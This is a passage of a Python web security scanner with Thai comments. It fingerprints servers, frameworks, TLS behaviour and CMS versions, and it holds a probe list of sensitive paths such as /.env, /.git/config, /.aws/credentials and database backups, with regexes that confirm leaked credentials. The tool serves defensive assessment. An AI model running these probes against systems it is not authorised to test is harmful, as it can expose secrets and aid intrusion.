    คืน host (หรือ host:port ถ้าพอร์ตไม่ใช่ 80/443) หรือ None ถ้าไม่ใช่โดเมน/IP ที่ถูกต้อง"""
    s = (raw or "").strip().strip('"').strip("'").strip()
    if not s:
        return None
    s2 = s if "://" in s else "https://" + s
    try:
        p = urlparse(s2)
        host = (p.hostname or "").strip().lower().rstrip(".")
        port = p.port
    except Exception:
        return None
    if not host or re.search(r"\s", host):
        return None
    is_ip = bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host))
    if not is_ip and "." not in host:
        return None                      # ต้องมีจุด (TLD) จึงจะถือว่าเป็นโดเมน
    if not re.match(r"^[a-z0-9.\-_:]+$", host) or host.startswith("_"):
        return None                      # อักขระที่ไม่ใช่โดเมน (หรือเป็น record ภายในที่ขึ้นต้นด้วย _)
    if port and port not in (80, 443):
        return f"{host}:{port}"
    return host


def read_host_list_file(path):
    """อ่านไฟล์ CSV/TXT (บรรทัดละโฮสต์) แล้วกรองให้เหลือแต่โดเมน/IP จริง
    - ตัด scheme (http://), path, query, port มาตรฐาน ออก
    - รองรับ CSV: แยกคอลัมน์ด้วย , ; | tab/ช่องว่าง แล้วเลือกฟิลด์แรกที่เป็นโดเมน
    - ข้ามบรรทัดว่าง, คอมเมนต์ (#, //, ;), และโดเมนซ้ำ (ไม่สนตัวพิมพ์)
    คืน (hosts:list, stats:dict)"""
    hosts, seen, skipped = [], set(), []
    raw_count, dup_count = 0, 0
    try:
        with open(path, "r", encoding="utf-8-sig", errors="replace") as f:
            text = f.read()
    except Exception as e:
        print(c(f"  ❌ อ่านไฟล์ไม่ได้: {e}", C.RED))
        return [], {"raw": 0, "valid": 0, "invalid": 0, "dup": 0, "skip_samples": []}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith(("#", "//", ";")):
            continue
        raw_count += 1
        dom = None
        for tok in re.split(r"[\s,;|\t]+", line):
            dom = extract_domain(tok)
            if dom:
                break
        if not dom:
            if len(skipped) < 5:
                skipped.append(line[:50])
            continue
        if dom in seen:
            dup_count += 1
            continue
        seen.add(dom)
        hosts.append(dom)
    return hosts, {"raw": raw_count, "valid": len(hosts),
                   "invalid": raw_count - len(hosts) - dup_count, "dup": dup_count,
                   "skip_samples": skipped}


def make_session(no_verify=False):
    s = requests.Session()
    s.verify = not no_verify
    s.headers.update({"User-Agent": DEFAULT_UA, "Accept": "*/*"})
    retry = Retry(total=1, backoff_factor=0,
                  status_forcelist=[429, 500, 502, 503, 504])
    s.mount("http://", HTTPAdapter(max_retries=retry))
    s.mount("https://", HTTPAdapter(max_retries=retry))
    if no_verify:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    return s


# ═══════════════════════════════════════════════════════════════════════
# SECTION 3 — Scanner
# ═══════════════════════════════════════════════════════════════════════

class _LinkParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.links, self.forms, self._form = [], [], None
        self.meta_generator = None

    def handle_starttag(self, tag, attrs):
        d = dict(attrs)
        if tag == "a" and d.get("href"):
            self.links.append(d["href"])
        elif tag == "script" and d.get("src"):
            self.links.append(d["src"])
        elif tag == "link" and d.get("href"):
            self.links.append(d["href"])
        elif tag == "meta" and d.get("name", "").lower() == "generator":
            self.meta_generator = d.get("content", "")
        elif tag == "form":
            self._form = {"action": d.get("action", ""),
                          "method": d.get("method", "get").lower(),
                          "inputs": []}
        elif tag in ("input", "textarea") and self._form is not None:
            if d.get("name"):
                self._form["inputs"].append(d["name"])

    def handle_endtag(self, tag):
        if tag == "form" and self._form is not None:
            self.forms.append(self._form)
            self._form = None


def _fingerprint(session, base, prefix, timeout, verbose=False):
    fp = {"os": "Unknown", "server_family": "Unknown", "server_version": "",
          "nginx_version": None, "nginx_plus": False, "php_versions": set(),
          "php_detected": False, "php_evidence": [],
          "sapi": "unknown", "reachable": False, "http3_hint": False,
          "http3_port": 443, "tls_hint": False, "tls_ticket_supported": None,
          "tls_session_reused": None, "tls_ticket_inconsistent": False,
          "nodejs_detected": False, "nodejs_versions": [],
          "nodejs_frameworks": [], "cdn_proxy": None, "headers": {},
          "os_version": "", "modules": {}, "device": None, "device_version": "",
          "device_category": "", "container_layers": [], "components": [],
          "composer_packages": [], "waf": None,
          "os_source": "", "os_confidence": "", "mac": "", "mac_vendor": ""}
    node_vers, node_fws = set(), set()
    php_ev = set()

    def _inspect_resp(r, is_error_probe=False):
        if r.status_code < 500 and not is_error_probe:
            fp["reachable"] = True
        for k, v in r.headers.items():
            kl = k.lower()
            if v not in fp["headers"].get(kl, []):
                fp["headers"].setdefault(kl, []).append(v)
        server = r.headers.get("Server", "")
        xpb = r.headers.get("X-Powered-By", "")
        via = r.headers.get("Via", "")
        x_srv = " ".join(r.headers.get(h, "") for h in ("X-Server", "X-Backend-Server", "X-Upstream"))
        body_head = (r.text or "")[:30000]
        combined_hdr = f"{server} {xpb} {via} {x_srv}"

        if fp["os"] == "Unknown":
            for pat, name in OS_PATTERNS:
                if pat.search(combined_hdr) or pat.search(body_head[:4000]):
                    fp["os"] = name
                    break
        if fp["server_family"] == "Unknown":
            for pat, fam in SERVER_SIGS:
                m = pat.search(combined_hdr)
                if m:
                    fp["server_family"] = fam
                    if m.lastindex and m.group(1):
                        fp["server_version"] = m.group(1)
                    break
        # ตรวจจับ NGINX / OpenResty ทั้งจาก header และจากหน้า error/body (เหมือน PHP)
        nginx_blob = f"{combined_hdr}\n{body_head[:8000]}"
        if "nginx" in combined_hdr.lower() or "openresty" in combined_hdr.lower() or re.search(
            r"<center>\s*(?:nginx|openresty)(?:/\d+\.\d+\.\d+)?", body_head, re.I
        ):
            if fp["server_family"] in ("Unknown", "OpenResty"):
                fp["server_family"] = "NGINX"
            if "nginx plus" in nginx_blob.lower():
                fp["nginx_plus"] = True
            if not fp["nginx_version"]:
                m = NGINX_VER_RE.search(nginx_blob)
                if m:
                    fp["nginx_version"] = m.group(1)
                    if not fp["server_version"]:
                        fp["server_version"] = m.group(1)

        for m in VERSION_RE.finditer(combined_hdr + " " + body_head[:20000]):
            fp["php_versions"].add(m.group(1))
            fp["php_detected"] = True
            php_ev.add(f"PHP/{m.group(1)}")
        if re.search(r"\bphp\b", xpb, re.I) or re.search(r"\bphp/", server, re.I):
            fp["php_detected"] = True
            php_ev.add("X-Powered-By/Server PHP header")

        # ตรวจจับคุกกี้และสัญลักษณ์ของระบบ PHP
        sc = r.headers.get("Set-Cookie", "") or ""
        sc_low = sc.lower()
        if any(tok in sc_low for tok in ("phpsessid=", "laravel_session=", "ci_session=", "cakephp=", "yii", "wordpress_", "wp-settings-")):
            fp["php_detected"] = True
            php_ev.add("PHP session/framework cookie")
        body_low = body_head[:15000].lower()
        if any(err in body_low for err in PHP_ERR_MARKERS):
            fp["php_detected"] = True
            php_ev.add("PHP error marker")
        if any(m_str in body_low for m_str in ("/wp-content/", "/wp-includes/", "drupal.settings", "/sites/default/files/")):
            fp["php_detected"] = True
            php_ev.add("PHP CMS asset marker")

        # ── Deep fingerprint: OS version token, server modules, device/NAS, container layer ──
        # blob รวมทุกแหล่ง (header ทั้งก้อน + cookie + body + title) สำหรับ signature matching
        all_hdr_blob = " ".join(f"{k}: {v}" for k, v in r.headers.items())
        dev_blob = f"{all_hdr_blob}\n{sc}\n{body_head[:12000]}"
        dev_blob_low = dev_blob.lower()
        # OS token ใน Server header ของ Apache เช่น "(Ubuntu)" "(Red Hat...)" "(Win64)"
        if not fp["os_version"]:
            om = OS_PAREN_RE.search(server)
            if om:
                tok = om.group(1).strip()
                if re.search(r"ubuntu|debian|centos|red ?hat|rhel|alpine|win|fedora|suse|amazon|oracle|unix", tok, re.I):
                    fp["os_version"] = tok
                    if fp["os"] == "Unknown":
                        fp["os"] = tok
        # โมดูลเซิร์ฟเวอร์พร้อมเวอร์ชัน (เช่น OpenSSL/1.1.1f) — เก็บไว้เทียบ CVE
        for mm in MODULE_VER_RE.finditer(combined_hdr):
            fp["modules"].setdefault(mm.group(1), mm.group(2))
        # ชนิดอุปกรณ์ / NAS / appliance / control panel
        if not fp["device"]:
            for name, sigs, ver_re, cat in DEVICE_SIGS:
                if any(re.search(s, dev_blob_low) for s in sigs):
                    fp["device"] = name
                    fp["device_category"] = cat
                    if ver_re:
                        vm = re.search(ver_re, dev_blob, re.I)
                        if vm:
                            fp["device_version"] = vm.group(1)
                    break
        # ชั้น container / reverse-proxy ที่เห็นจากภายนอก
        for name, sigs in CONTAINER_SIGS:
            if name not in fp["container_layers"] and any(re.search(s, dev_blob_low) for s in sigs):
                fp["container_layers"].append(name)

        # ── Component detection: Database (ทางอ้อม), admin tools, JS libraries ──
        _extract_components(fp, dev_blob_low, dev_blob, body_head)

        # ตรวจจับ CDN / Reverse Proxy ที่คั่นหน้าเซิร์ฟเวอร์จริง
        hdr_keys = {k.lower() for k in r.headers.keys()}
        if "cf-ray" in hdr_keys or "cloudflare" in server.lower():
            fp["cdn_proxy"] = "Cloudflare"
        elif "x-amz-cf-id" in hdr_keys or "cloudfront" in via.lower():
            fp["cdn_proxy"] = "CloudFront"
        elif "x-fastly-request-id" in hdr_keys or "fastly" in via.lower():
            fp["cdn_proxy"] = "Fastly"

        # ตรวจจับ Alt-Svc สำหรับ HTTP/3 พร้อมพอร์ตจริง
        alt_svc = r.headers.get("Alt-Svc", "") or r.headers.get("alt-svc", "")
        if alt_svc and re.search(r'\b(?:h3(?:-\d+)?|quic)\s*=', alt_svc, re.I):
            fp["http3_hint"] = True
            pm = re.search(r'\b(?:h3(?:-\d+)?|quic)\s*=\s*"[^"]*?:(\d+)"', alt_svc, re.I)
            if pm:
                try:
                    fp["http3_port"] = int(pm.group(1))
                except ValueError:
                    pass
        if base.startswith("https://"):
            fp["tls_hint"] = True

        # ตรวจจับ Node.js จาก Headers, Cookies, Body และสะสมเลขเวอร์ชัน
        if any(k in hdr_keys for k in ("x-nextjs-cache", "x-nextjs-matched-path", "x-middleware-rewrite")) or \
           "/_next/static/" in body_head or "__NEXT_DATA__" in body_head:
            fp["nodejs_detected"] = True
            node_fws.add("Next.js")
        if "__NUXT__" in body_head or "/_nuxt/" in body_head:
            fp["nodejs_detected"] = True
            node_fws.add("Nuxt")
        if "__sveltekit" in body_head or "x-sveltekit-page" in hdr_keys:
            fp["nodejs_detected"] = True
            node_fws.add("SvelteKit")
        if "__remixContext" in body_head or "x-remix-response" in hdr_keys:
            fp["nodejs_detected"] = True
            node_fws.add("Remix")
        if "connect.sid=" in sc or "koa:sess=" in sc or "feathers-jwt" in sc or re.search(r"=s%3A[A-Za-z0-9+/=_-]{16,}", sc):
            fp["nodejs_detected"] = True
            node_fws.add("Express/Node-Session")
        for m in NODE_VER_RE.finditer(combined_hdr + "\n" + body_head[:15000]):
            fp["nodejs_detected"] = True
            node_vers.add(m.group(1))
        for m in NEXT_VER_RE.finditer(combined_hdr + "\n" + body_head[:15000]):
            fp["nodejs_detected"] = True
            node_fws.add(f"Next.js {m.group(1)}")
        for m in UNDICI_VER_RE.finditer(combined_hdr + "\n" + body_head[:15000]):
            fp["nodejs_detected"] = True
            node_fws.add(f"undici {m.group(1)}")

    r_root, r_idx_php = None, None
    for path in ["/", "/index.php"]:
        try:
            r = session.get(base + prefix + path, timeout=timeout, allow_redirects=True)
            _inspect_resp(r, is_error_probe=False)
            if path == "/":
                r_root = r
            elif path == "/index.php":
                r_idx_php = r
        except requests.RequestException:
            continue

    # ตรวจสอบหน้า 404/Error เพื่อ:
    # 1) สกัดเลขเวอร์ชัน NGINX ใน default error footer (กรณีซ่อนในหน้าปกติ)
    # 2) ยืนยันว่า /index.php เป็นไฟล์ PHP จริง ไม่ใช่ SPA catch-all ที่ตอบ 200 ทุก URL
    r_404_php = None
    if fp["reachable"]:
        probe_404_php = f"/rmutcert-404-{uuid.uuid4().hex[:6]}.php"
        for err_path in [probe_404_php, "/%00"]:
            try:
                r_err = session.get(base + prefix + err_path, timeout=min(timeout, 4.0), allow_redirects=False)
                _inspect_resp(r_err, is_error_probe=True)
                if err_path == probe_404_php:
                    r_404_php = r_err
                if fp["nginx_version"] and r_404_php is not None:
                    break
            except requests.RequestException:
                continue

    # ยืนยันว่ามี PHP รันจริงจากพฤติกรรมของ /index.php เทียบกับ non-existent .php
    if not fp["php_detected"] and r_idx_php is not None and r_idx_php.status_code == 200:
        idx_ct = (r_idx_php.headers.get("Content-Type", "") or "").lower()
        idx_url_path = urlparse(r_idx_php.url or "").path.lower()
        # ถ้าไม่ถูก redirect หนีไปหน้าอื่นที่ไม่มี .php และไม่ใช่ SPA ที่ตอบ 200 เหมือนกันกับไฟล์ .php ที่ไม่มีอยู่จริง
        if (idx_url_path.endswith(".php") or idx_url_path.endswith("/")) and "html" in idx_ct:
            if r_404_php is not None and r_404_php.status_code in (404, 403) and hash_body(r_idx_php.text) != hash_body(r_404_php.text):
                # ตรวจเพิ่มว่าไม่ใช่ Node.js/SPA ที่บังเอิญมี route /index.php
                if not fp["nodejs_detected"]:
                    fp["php_detected"] = True
                    php_ev.add("/index.php HTTP 200 (verified against 404 .php probe)")

    fp["nodejs_versions"] = sorted(node_vers)
    fp["nodejs_frameworks"] = sorted(node_fws)
    if fp["php_versions"]:
        fp["php_detected"] = True
    fp["php_evidence"] = sorted(php_ev)

    # กำหนด SAPI เฉพาะเมื่อตรวจพบหลักฐานว่ามี PHP รันอยู่จริงเท่านั้น (ไม่เหมารวมทุกเว็บ NGINX ว่าเป็น php-fpm)
    h = " ".join([fp["headers"].get("server", [""])[0],
                  fp["headers"].get("x-powered-by", [""])[0]]).lower()
    if fp["php_detected"]:
        if "apache" in h:
            fp["sapi"] = "mod_php"
        elif "nginx" in h or "openresty" in h or fp["server_family"] in ("NGINX", "OpenResty"):
            fp["sapi"] = "php-fpm"
        elif "iis" in h or fp["server_family"] == "IIS":
            fp["sapi"] = "php-cgi"
        elif "litespeed" in h or fp["server_family"] == "LiteSpeed":
            fp["sapi"] = "litespeed-php"
        else:
            fp["sapi"] = "php-unknown"
    else:
        fp["sapi"] = "none"
    if base.startswith("https://"):
        try:
            import ssl as _ssl, socket as _sock
            from datetime import datetime as _dt
            _parsed = urlparse(base)
            _host = _parsed.hostname
            _port = _parsed.port or 443
            _ctx = _ssl.create_default_context()
            if not session.verify:
                _ctx.check_hostname = False
                _ctx.verify_mode = _ssl.CERT_NONE
            _saved_sess = None
            with _sock.create_connection((_host, _port), timeout=4) as _s:
                with _ctx.wrap_socket(_s, server_hostname=_host) as _ss:
                    fp["tls_version"] = _ss.version()
                    _saved_sess = _ss.session
                    if _saved_sess is not None:
                        fp["tls_ticket_supported"] = bool(getattr(_saved_sess, "has_ticket", False))
                    _cert = _ss.getpeercert() or {}
                    _na = _cert.get("notAfter")
                    if _na:
                        _exp = _dt.strptime(_na, "%b %d %H:%M:%S %Y %Z")
                        fp["cert_expiry"] = _exp.strftime("%Y-%m-%d")
                        fp["cert_days_left"] = (_exp - _dt.now(timezone.utc).replace(tzinfo=None)).days
            # ทดสอบ TLS Session Ticket Resumption ข้ามการเชื่อมต่อ (ตรวจ CVE-2026-97629)
            if _saved_sess is not None:
                _reused_results = []
                for _ in range(2):
                    try:
                        with _sock.create_connection((_host, _port), timeout=2.5) as _s2:
                            with _ctx.wrap_socket(_s2, server_hostname=_host, session=_saved_sess) as _ss2:
                                _reused_results.append(bool(_ss2.session_reused))
                    except Exception:
                        break
                if _reused_results:
                    fp["tls_session_reused"] = any(_reused_results)
                    if any(_reused_results):
                        fp["tls_ticket_supported"] = True
                    elif fp["tls_ticket_supported"] is None:
                        fp["tls_ticket_supported"] = False
                    # หาก worker หนึ่งรับ ticket แต่อีก worker ปฏิเสธ แปลว่า ticket key ไม่ได้แชร์/init ครบทุก worker
                    if True in _reused_results and False in _reused_results:
                        fp["tls_ticket_inconsistent"] = True
        except _ssl.SSLCertVerificationError:
            fp["cert_problem"] = True
        except Exception:
            pass
    return fp


# ═══════════════════════════════════════════════════════════════════════
# App/CMS version detection (กลุ่ม 1 ของ ThaiCERT) — ดึง "เลขเวอร์ชันของแอป"
# เพื่อนำไปเทียบ CVE ต่อ (offline EOL flag + online lookup ใน _online_app_cves)
# ═══════════════════════════════════════════════════════════════════════
def _app_ver_tuple(s):
    """'30.0.1' / '6.5' / '7.98' → (a,b,c) เติมให้ครบ 3 ช่อง; None ถ้าไม่พบตัวเลข"""
    m = re.search(r"(\d+)(?:\.(\d+))?(?:\.(\d+))?", s or "")
    if not m:
        return None
    return (int(m.group(1)), int(m.group(2) or 0), int(m.group(3) or 0))


# สาขาหลักที่ "สิ้นสุดการสนับสนุนแน่นอน" (ข้อเท็จจริงที่ยืนยันได้ — ใช้ flag รุ่นเก่าแบบ offline)
# รายละเอียด CVE เฉพาะเจาะจงปล่อยให้ online lookup เสริม (hybrid)
APP_EOL_MAJOR = {
    "WordPress": (5, "WordPress < 5.x เป็นรุ่นเก่ามาก (ก่อนปี 2018) ไม่ได้รับแพตช์ความปลอดภัยสาขาเดิม"),
    "Joomla":    (4, "Joomla < 4.x สิ้นสุดการสนับสนุนแล้ว (สาขา 1.x / 2.5 / 3.x EOL)"),
    "Drupal":    (10, "Drupal < 10 สิ้นสุดการสนับสนุนแล้ว (สาขา 7 / 8 / 9 EOL)"),
    "Nextcloud": (26, "Nextcloud < 26 เป็นรุ่นเก่า (แต่ละ major รองรับราว 1 ปี) ควรตรวจสถานะแพตช์"),
    "Moodle":    (4, "Moodle < 4.1 เป็นรุ่นเก่า/สิ้นสุดการสนับสนุนความปลอดภัย (EOL)"),
}
# เพดาน major ที่ "มีอยู่จริง" (ต.ค. 2026) — ถ้าตรวจพบสูงกว่านี้แปลว่าเวอร์ชันถูกปลอม/ซ่อน
# (เช่น ปลั๊กอิน hardening แก้ meta generator) — scanner ควรเตือนว่าเลขไม่น่าเชื่อถือ
APP_MAX_PLAUSIBLE = {"WordPress": 6, "Joomla": 5, "Drupal": 11, "Moodle": 5}


def _detect_app_versions(session, base, prefix, timeout, cms, root_html="", meta_gen=""):
    """ดึงเวอร์ชัน core ของแอป + ปลั๊กอิน WordPress (เบา ๆ) — คืน dict
    {product, version(tuple), version_str, source, plugins:[{slug,version}]}"""
    out = {"product": cms, "version": None, "version_str": "", "source": "", "plugins": []}

    def _get(path):
        try:
            return session.get(base + prefix + path, timeout=min(timeout, 6.0), allow_redirects=True)
        except requests.RequestException:
            return None

    try:
        # Nextcloud — status.php คืน JSON เวอร์ชันเป๊ะ (ตรวจเสมอ เพราะไม่เข้า CMS_PATTERNS)
        if cms in (None, "Nextcloud"):
            r = _get("/status.php")
            if r is not None and r.status_code == 200 and "version" in (r.text or "").lower():
                try:
                    j = r.json()
                    vs = (j.get("versionstring") or j.get("version") or "").strip()
                    if vs and (j.get("installed") or j.get("version")):
                        out.update(product="Nextcloud", version=_app_ver_tuple(vs),
                                   version_str=vs, source="status.php")
                        return out
                except ValueError:
                    pass

        if cms == "WordPress":
            vstr, src = "", ""
            m = re.search(r"wordpress\s+([\d.]+)", meta_gen or "", re.I)
            if m:
                vstr, src = m.group(1), "meta generator"
            if not vstr:
                r = _get("/readme.html")
                if r is not None and r.status_code == 200:
                    m = re.search(r"[Vv]ersion\s+([\d.]+)", r.text or "")
                    if m:
                        vstr, src = m.group(1), "readme.html"
            if not vstr:
                r = _get("/?feed=rss2")
                if r is not None and r.status_code == 200:
                    m = re.search(r"wordpress\.org/\?v=([\d.]+)", r.text or "", re.I)
                    if m:
                        vstr, src = m.group(1), "rss generator"
            if vstr:
                out.update(version=_app_ver_tuple(vstr), version_str=vstr, source=src)
            # ปลั๊กอินจาก ?ver= ใน HTML หน้าแรก (ไม่ยิง request เพิ่ม)
            seen = {}
            for pm in re.finditer(r"/wp-content/plugins/([A-Za-z0-9._-]+)/[^\"'>]*?\?ver=([\d.]+)", root_html or ""):
                seen.setdefault(pm.group(1), pm.group(2))
            out["plugins"] = [{"slug": s, "version": v} for s, v in list(seen.items())[:30]]

        elif cms == "Drupal":
            for path in ("/CHANGELOG.txt", "/core/CHANGELOG.txt"):
                r = _get(path)
                if r is not None and r.status_code == 200 and r.text:
                    m = re.search(r"Drupal\s+([\d.]+)", r.text)
                    if m:
                        out.update(version=_app_ver_tuple(m.group(1)), version_str=m.group(1),
                                   source=path.lstrip("/"))
                        break

        elif cms == "Joomla":
            r = _get("/administrator/manifests/files/joomla.xml")
            if r is not None and r.status_code == 200 and r.text:
                m = re.search(r"<version>\s*([\d.]+)\s*</version>", r.text)
                if m:
                    out.update(version=_app_ver_tuple(m.group(1)), version_str=m.group(1),
                               source="joomla.xml")

        elif cms == "Moodle":
            vstr, src = "", ""
            m = re.search(r"moodle\s+([\d.]+)", meta_gen or "", re.I)
            if m:
                vstr, src = m.group(1), "meta generator"
            if not vstr:
                for path in ("/admin/environment.xml", "/moodle/admin/environment.xml"):
                    r = _get(path)
                    if r is not None and r.status_code == 200 and r.text:
                        m = re.search(r'<MOODLE\s+version="([\d.]+)"', r.text, re.I)
                        if m:
                            vstr, src = m.group(1), path.lstrip("/")
                            break
            if not vstr:
                for path in ("/lib/upgrade.txt", "/moodle/lib/upgrade.txt"):
                    r = _get(path)
                    if r is not None and r.status_code == 200 and r.text:
                        m = re.search(r"=== ([\d.]+) ===", r.text)
                        if m:
                            vstr, src = m.group(1), path.lstrip("/")
                            break
            if vstr:
                out.update(version=_app_ver_tuple(vstr), version_str=vstr, source=src)
    except Exception:
        pass
    return out


def _analyze_apps(cms_info):
    """สร้าง finding จากเวอร์ชันแอป (offline): flag รุ่น EOL/เก่ามาก + เป็น hook ให้ online CVE เสริม
    คืน {key: finding} รูปแบบเดียวกับ CVE อื่น ๆ (pseudo-id ขึ้นต้น APP-)"""
    out = {}
    app = (cms_info or {}).get("app") or {}
    product = app.get("product") or (cms_info or {}).get("cms")
    vt, vs = app.get("version"), app.get("version_str", "")
    if not product or not vt:
        return out
    eol = APP_EOL_MAJOR.get(product)
    key = f"APP-{product}"
    src = app.get("source", "")
    ceiling = APP_MAX_PLAUSIBLE.get(product)
    if ceiling and vt[0] > ceiling:
        # เวอร์ชันสูงเกินกว่าที่มีอยู่จริง → ถูกปลอม/ซ่อน ต้องยืนยันของจริง
        out[key] = {
            "cve": key, "name": f"{product} {vs} — เวอร์ชันไม่น่าเป็นจริง (อาจถูกปลอม)",
            "severity": "Low", "trigger": "ตรวจความสมเหตุสมผลของเลขเวอร์ชัน",
            "host_check": f"ยืนยันเวอร์ชัน {product} จริงบนเครื่อง (อย่าเชื่อ meta generator)",
            "status": "unknown",
            "reason": (f"ตรวจพบ {product} {vs} (จาก {src}) แต่สาขาสูงสุดที่มีจริงคือ {ceiling}.x "
                       f"— เลขนี้น่าจะถูกปลอม/ซ่อน (เช่น ปลั๊กอิน hardening) ต้องยืนยันเวอร์ชันจริงบนเครื่องก่อนประเมิน CVE"),
        }
        plugins = app.get("plugins") or []
        if plugins:
            out[key]["reason"] += f" | ปลั๊กอินที่พบ: " + ", ".join(f"{p['slug']} {p['version']}" for p in plugins[:10])
        return out
    if eol and vt[0] < eol[0]:
        out[key] = {
            "cve": key, "name": f"{product} {vs} — รุ่นเก่า/สิ้นสุดการสนับสนุน",
            "severity": "High", "trigger": "เทียบเลขเวอร์ชันแอปกับสาขาที่ยังได้รับแพตช์",
            "host_check": f"อัปเดต {product} เป็นสาขาล่าสุดที่รองรับ แล้วตรวจ CVE ที่เกี่ยวข้อง",
            "status": "vulnerable-version",
            "reason": f"ตรวจพบ {product} {vs} (จาก {src}) — {eol[1]} ควรอัปเดตและตรวจ CVE ที่เกี่ยวข้อง",
        }
    else:
        out[key] = {
            "cve": key, "name": f"{product} {vs} — ตรวจพบเวอร์ชัน",
            "severity": "Low", "trigger": "ตรวจพบเวอร์ชันแอป",
            "host_check": f"ตรวจว่า {product} {vs} เป็นรุ่นล่าสุดและได้รับแพตช์ล่าสุด",
            "status": "unknown",
            "reason": f"ตรวจพบ {product} {vs} (จาก {src}) — เปิด online CVE lookup เพื่อตรวจช่องโหว่ที่ทราบ",
        }
    plugins = app.get("plugins") or []
    if plugins:
        plist = ", ".join(f"{p['slug']} {p['version']}" for p in plugins[:10])
        out[key]["reason"] += f" | ปลั๊กอินที่พบ: {plist}"
    return out


def _analyze_device(fp):
    """finding จากชนิดอุปกรณ์/NAS/appliance ที่ตรวจพบ (hook ให้ online CVE firmware เสริมใน increment ถัดไป)"""
    out = {}
    dev = (fp or {}).get("device")
    if not dev:
        return out
    ver = fp.get("device_version", "")
    cat = fp.get("device_category", "") or "อุปกรณ์"
    key = f"DEVICE-{dev}"
    out[key] = {
        "cve": key,
        "name": f"{dev}{(' ' + ver) if ver else ''} — {cat}",
        "severity": "Medium" if ver else "Low",
        "trigger": "ตรวจพบ signature อุปกรณ์/แพลตฟอร์ม",
        "host_check": f"ตรวจรุ่น firmware ของ {dev} และอัปเดตตาม advisory ของผู้ผลิต",
        "status": "unknown",
        "reason": (f"ตรวจพบ {dev}" + (f" firmware {ver}" if ver else " (เวอร์ชันถูกซ่อน)")
                   + f" — หมวด {cat}; อุปกรณ์กลุ่มนี้มี CVE firmware ของตัวเอง ควรตรวจรุ่นและ advisory ผู้ผลิต"
                   + ("" if ver else " และยืนยันเวอร์ชันบนอุปกรณ์")),
    }
    return out


def _analyze_components(fp):
    """finding จาก Database / admin tools / JS libraries ที่ตรวจพบ (เวอร์ชัน → hook online CVE)"""
    out = {}
    for comp in fp.get("components") or []:
        typ, nm = comp["type"], comp["name"]
        ver, src = comp.get("version", ""), comp.get("source", "")
        key = f"COMP-{typ}-{nm}".replace(" ", "")
        exposed_tool = typ == "Tool" and nm in ("phpMyAdmin", "Adminer", "phpinfo()", "phpPgAdmin")
        sev = "Medium" if exposed_tool else ("Low" if ver else "Info")
        status = "vulnerable-conditions" if exposed_tool else "unknown"
        reason = f"ตรวจพบ {typ}: {nm}" + (f" {ver}" if ver else " (เวอร์ชันไม่ทราบ)") + f" (จาก {src})"
        if exposed_tool:
            reason += " — เครื่องมือจัดการที่เข้าถึงได้จากภายนอก ควรจำกัด IP/ปิดถ้าไม่จำเป็น"
        elif typ == "Database":
            reason += " — เห็นผ่าน error/tool (ไม่ได้ต่อ DB ตรง) ควรปิด error ที่รั่วและตรวจเวอร์ชัน DB บนเครื่อง"
        elif ver:
            reason += " — ควรตรวจ CVE ของเวอร์ชันนี้ (online lookup ช่วยได้)"
        out[key] = {
            "cve": key, "name": f"{nm}{(' ' + ver) if ver else ''} — {typ}",
            "severity": sev, "trigger": "ตรวจพบส่วนประกอบ",
            "host_check": f"ตรวจ/อัปเดต {nm}" + (" และจำกัดการเข้าถึง" if exposed_tool else ""),
            "status": status, "reason": reason,
        }
    return out


# ไฟล์/endpoint ที่ "ไม่ควรเข้าถึงได้จากภายนอก" — แต่ละตัวมี validator กันผลบวกปลอม (SPA ตอบ 200 ทุก URL)
# (path, ชื่อ, severity, regex ยืนยันเนื้อหา|None)
EXPOSURE_CHECKS = [
    ("/.env", "ไฟล์ .env เปิดเผย (อาจมี DB credentials/APP_KEY)", "Critical", r"(?:APP_KEY|DB_PASSWORD|DB_HOST|APP_ENV|MAIL_PASSWORD)\s*="),
    ("/.env.bak", "ไฟล์ .env สำรองเปิดเผย", "Critical", r"(?:APP_KEY|DB_PASSWORD)\s*="),
    ("/.env.save", "ไฟล์ .env สำรองเปิดเผย", "Critical", r"(?:APP_KEY|DB_PASSWORD)\s*="),
    ("/.git/HEAD", "Git repository เปิดเผย (.git/HEAD)", "High", r"ref:\s*refs/"),
    ("/.git/config", "Git config เปิดเผย (.git/config)", "High", r"\[core\]|\[remote"),
    ("/composer.lock", "composer.lock เปิดเผย (เผยเวอร์ชันแพ็กเกจ PHP ทั้งหมด → เทียบ CVE ได้)", "Medium", r"\"packages\""),
    ("/composer.json", "composer.json เปิดเผย (เผย dependency)", "Low", r"\"require\""),
    ("/package.json", "package.json เปิดเผย (เผย JS dependency)", "Low", r"\"dependencies\"|\"devDependencies\""),
    ("/wp-config.php.bak", "สำรอง wp-config.php เปิดเผย (DB credentials)", "Critical", r"DB_PASSWORD|DB_NAME|AUTH_KEY"),
    ("/wp-config.php~", "สำรอง wp-config.php เปิดเผย (DB credentials)", "Critical", r"DB_PASSWORD|DB_NAME"),
    ("/phpinfo.php", "phpinfo() เปิดเผย (เผยคอนฟิก/พาธ/โมดูลทั้งหมด)", "High", r"phpinfo\(\)|<title>phpinfo"),
    ("/info.php", "phpinfo() เปิดเผย", "High", r"phpinfo\(\)|<title>phpinfo"),
    ("/server-status", "Apache mod_status (server-status) เปิดสาธารณะ", "Medium", r"Apache Server Status"),
    ("/server-info", "Apache mod_info (server-info) เปิดสาธารณะ", "Medium", r"Apache Server Information"),
    ("/web.config", "web.config (IIS) เปิดเผย", "Medium", r"<configuration"),
    ("/.aws/credentials", "AWS credentials เปิดเผย", "Critical", r"aws_access_key_id|aws_secret"),
    ("/backup.sql", "ดัมป์ฐานข้อมูล (.sql) เปิดเผย", "Critical", r"INSERT INTO|CREATE TABLE|-- MySQL dump"),
    ("/.DS_Store", ".DS_Store เปิดเผย (โครงสร้างไฟล์)", "Low", r"Bud1|\x00\x00\x00\x01"),
    ("/backup/", "ไดเรกทอรี /backup/ เปิดเผย (อาจมีไฟล์สำรองค้าง)", "Medium", r"Index of|parent directory|\.zip|\.sql|\.tar|\.bak"),
    ("/old/", "ไดเรกทอรี /old/ (ระบบเก่าค้างในระบบ) เปิดเผย", "Medium", r"Index of|parent directory"),
    ("/temp/", "ไดเรกทอรี /temp/ เปิดเผย", "Low", r"Index of|parent directory"),
]


def _parse_composer_lock(text):
    """แยกรายชื่อแพ็กเกจ PHP + เวอร์ชันจาก composer.lock (หรือ composer.json) → [{name, version}]"""
    out = []
    try:
        data = json.loads(text)
    except Exception:
        return out
